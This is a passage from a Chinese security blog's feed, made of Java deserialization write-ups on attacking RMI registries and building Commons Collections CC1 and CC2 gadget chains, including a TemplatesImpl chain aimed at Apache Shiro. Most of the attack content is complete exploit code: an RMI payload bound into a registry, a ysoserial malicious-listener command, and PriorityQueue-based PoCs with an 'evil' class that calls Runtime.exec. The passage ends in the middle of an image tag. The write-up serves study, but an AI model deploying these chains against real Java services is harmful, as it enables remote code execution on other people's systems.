<span class="title class_">Class</span>[] &#123; Remote.class&#125;, getpayload()));</span><br></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiCC1client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">proxyEvalObject</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class&#125;, getpayload()));</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://192.168.0.103:1099/RemoteObject&quot;</span>, proxyEvalObject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">AnnotationInvocationHandlerClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">instance</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>嫌麻烦懒得切文件，把注册表和客户端融合了，加了一句<code>LocateRegistry.createRegistry(1099);</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221210170635497.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221210170635497.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221210170635497"></p><p>由于RMI采用了DGC分布式垃圾回收机制，还能用JRMP攻击注册中心。此处省略</p><h2 id="Registry攻击server和client"><a href="#Registry攻击server和client" class="headerlink" title="Registry攻击server和client"></a>Registry攻击server和client</h2><p>registry作为中间代理，理应“大杀四方”。在客户端和服务端需要接收返回结果时，registry都能进行攻击。包括bind()、lookup()、rebind()、unbind()、list()这些Naming库里的方法。但是由于registry端多半不可控，这里简述</p><p>用ysoerial生成恶意注册中心:<code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &quot;calc&quot;</code></p><p>当server或者client调用注册中心的上面五种方法时，就会返回恶意对象</p><h2 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h2><p>如果远程方法所需要的参数，和client传的参数都是Object，那当然可以直接攻击。而非Object也能攻击</p><p>在分析源码时，说到Server端时根据UnicastServerRef#dispatch来处理客户端请求，在hashToMethod_Map中寻找Method的hash</p><p><img src="https://image.3001.net/images/20221209/1670591117_6393328d970c5866b274f.png!small?1670591117860" class="lazyload placeholder" data-srcset="https://image.3001.net/images/20221209/1670591117_6393328d970c5866b274f.png!small?1670591117860" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="1670591117_6393328d970c5866b274f.png!small?1670591117860"></p><p>如果找到了就进行反射调用</p><p><img src="https://image.3001.net/images/20221209/1670591121_6393329183e99f42f8ac4.png!small?1670591122084" class="lazyload placeholder" data-srcset="https://image.3001.net/images/20221209/1670591121_6393329183e99f42f8ac4.png!small?1670591122084" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="1670591121_6393329183e99f42f8ac4.png!small?1670591122084"></p><p>Hash算法是SHA1</p><p>利用：在debug时，在RemoteObjectInvocationHandler的invokeRemoteMethod处下断点，将Method改为服务器需要的Method。或者在从字节码或者流量把method改掉</p><p>参考：<a href="https://www.freebuf.com/articles/web/324692.html">https://www.freebuf.com/articles/web/324692.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> RMI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RMI原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java_PriorityQueue构造无TransformingComparator CC2</title>
      <link href="/2022/10/23/java-priorityqueue/"/>
      <url>/2022/10/23/java-priorityqueue/</url>
      
        <content type="html"><![CDATA[<h1 id="java-PriorityQueue"><a href="#java-PriorityQueue" class="headerlink" title="java_PriorityQueue"></a>java_PriorityQueue</h1><p><code>java.util.PriorityQueue </code>是一个优先队列（Queue），节点之间按照优先级大小排序成一棵树。其中PriorityQueue有自己的readObject反序列化入口。</p><p>反序列化链为：<code>PriorityQueue#readObject</code>-&gt;<code>heapify()</code>-&gt;<code>siftDown()</code>-&gt;<code>siftDownUsingComparator()</code>-&gt;<code>comparator.compare()</code>。当comparator为TransformingComparator对象时，能触发transform()方法：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206160559047.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206160559047.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221206160559047"></p><p>至于PriorityQueue的<code>heapify()、siftDown()、siftDownUsingComparator()</code>的用处就是恢复排序、节点下移和比较元素大小。而Comparator则是定义了两个对象用什么方式比较</p><h2 id="CC2TransformingComparator"><a href="#CC2TransformingComparator" class="headerlink" title="CC2TransformingComparator"></a>CC2TransformingComparator</h2><p>结合CC2的利用方式，就是向TransformingComparator传入恶意Transformer。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br></pre></td></tr></table></figure><p>再用priorityQueue触发comparator:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>可以add任何非null对象，因为触发transform与队列参数无关（比较的是1,2，比较方式为comparator.compare()）</p><ul><li>POC：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2TransformingComparator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试结果：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206161847500.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206161847500.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221206161847500"></p><h2 id="TemplatesImpl无数组TransformingComparator"><a href="#TemplatesImpl无数组TransformingComparator" class="headerlink" title="TemplatesImpl无数组TransformingComparator"></a>TemplatesImpl无数组TransformingComparator</h2><p>用TemplatesImpl字节码的方式也能进行利用，并且还能用于shiro的无数组链：</p><p>同样的向TransformingComparator传入恶意Transformer，这次传的是InvokerTransformer，而非transformerChain数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br></pre></td></tr></table></figure><p>触发comparator的方式还是实例化PriorityQueue对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(obj);</span><br><span class="line">queue.add(obj);</span><br></pre></td></tr></table></figure><p>为什么要传TemplatesImpl的对象obj呢？回想在没有ConstantTransformer初始化对象的情况下，shiro反序列化是依靠TiedMapEntry的构造函数把初始化对象传入key</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206164448132.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206164448132.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221206164448132"></p><p>TiedMapEntry的hashcode调用了getValue，getValue触发lazyMap.get()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206164623593.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206164623593.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221206164623593"></p><p>但是在使用PriorityQueue类时，就无法用到shiro的入口HashMap，自然整条链都用不了。进入templatesImpl对象的newTransformer()入口的方式变为:</p><p><code>PriorityQueue#Compare()</code>-&gt;<code>TransformingComparator#transform</code>-&gt;<code>InvokerTransformer</code>-&gt;<code>TemplatesImpl#newTransformer()</code></p><p>只需要compare()时对象为恶意InvokerTransformer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206160559047.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206160559047.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221206160559047"></p><p>恶意字节码类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello TemplatesImpl&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroTransformingComparator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytescode() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(evil.EvilTemplatesImpl.class.getName());</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getBytescode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(obj);</span><br><span class="line">        queue.add(obj);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206173016563.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206173016563.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" 